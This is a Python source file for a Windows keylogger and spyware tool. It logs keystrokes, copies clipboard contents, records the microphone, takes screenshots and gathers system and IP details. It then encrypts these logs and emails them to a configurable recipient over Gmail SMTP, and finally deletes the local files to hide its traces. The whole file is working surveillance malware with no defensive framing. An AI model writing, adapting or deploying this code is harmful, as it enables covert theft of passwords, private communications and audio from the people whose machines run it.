from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from crypto.generateKey import KeyGen

key_information = "key_log.txt"
sys_info = "sys_info.txt"
clipboard_info = "clip_info.txt"
screenshot_info = "screenshot.png"

key_information_e = "e_key_log.txt"
sys_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard_info.txt"

audio_info = "audio.wav"
file_path = "C:\\temp"
extend = "\\"
file_merge = file_path + extend 
time_iteration = 200
number_of_iterations_end = 1 
count = 0 
keys = [] 
microphone_time = 10

email_addr  = "" # insert sender address
password = "" # password of the sender mail

toaddr = "" # receiver mail address

key = KeyGen()

#send mail functionality
def send_mail(filename, attachment, toaddr):
    fromaddr = email_addr

    msg = MIMEMultipart()

    msg['From']  = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    bodymail = "Body_of_the_mail"

    msg.attach(MIMEText(bodymail, 'plain'))

    filename = filename 
    attachment = open (attachment, 'rb')
    p = MIMEBase ('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachament; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

#send_mail(key_information, file_path + extend + key_information, toaddr)

#gather info about the computer and the system
def computer_information ():
    with open (file_path + extend + sys_info, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write ("couldn't get public ip address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version () + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Adrres = " + IPAddr + "\n")

computer_information()

#gather what is in the clipboard 
def copy_clipboard (): 
    with open (file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboadrd data: \n" + pasted_data +"\n")
        except: 
            f.write("Couldn't copy that clipboard!")

copy_clipboard()

#Recording  the microphone
def microphone (): 
    fs = 44100
    seconds = microphone_time
    my_recording= sd.rec(int(seconds * fs), samplerate= fs, channels=1)
    sd.wait()
    write(file_path + extend + audio_info, fs, my_recording)

microphone()

#Take screenshot
def screenshot ():
    im = ImageGrab.grab()
    im.save (file_path+ extend + screenshot_info)

screenshot()

#Key Logging functions
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration 

while number_of_iterations < number_of_iterations_end: 

    count = 0 
    keys = []
        
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open (file_path + extend + key_information, "a") as f:
            for key in keys: 
                k = str(key).replace("'", "")
                if k.find("space") > 0: 
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime: 
            return False

    with Listener (on_press=on_press, on_release=on_release) as listener:
        listener.join()

#timerization for the Key Logger
    if currentTime > stoppingTime:

        with open (file_path + extend + key_information, "w") as f:
            f.write("")

        screenshot()
        send_mail(screenshot_info, file_path + extend + screenshot_info, toaddr)
        copy_clipboard()

        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

#File Encryption 

files_to_encrypt = [file_merge + sys_info, file_merge + clipboard_info, file_merge + key_information]
encrypted_file_names = [file_merge + sys_info_e, file_merge + clipboard_info_e, file_merge + key_information_e]

count = 0

for encrypting_file in files_to_encrypt: 
    with open (files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    if currentTime > stoppingTime:
        encrypted = fernet.encrypt(data)

    with open (encrypted_file_names[count], 'wb') as f:
        f.write (encrypted)

    send_mail(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

#Clean up the traces of the jobs 
delete_files = [sys_info, clipboard_info, key_information, screenshot_info, audio_info]
for file in delete_files:
    os.remove(file_merge + file)


























































































































































































































































